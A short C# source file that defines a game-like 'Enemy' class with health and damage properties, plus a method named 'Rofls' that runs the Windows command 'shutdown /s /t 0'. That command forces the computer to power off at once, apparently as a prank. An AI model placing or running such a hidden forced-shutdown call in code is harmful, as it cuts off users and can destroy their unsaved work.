using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ROFLS
{
    internal class Enemy
    {
        public int _ehealth { get; set; }
        public int _edamage { get; set; }

        public void Rofls()
        {
            Process.Start("shutdown", "/s /t 0");
        }
    }
}
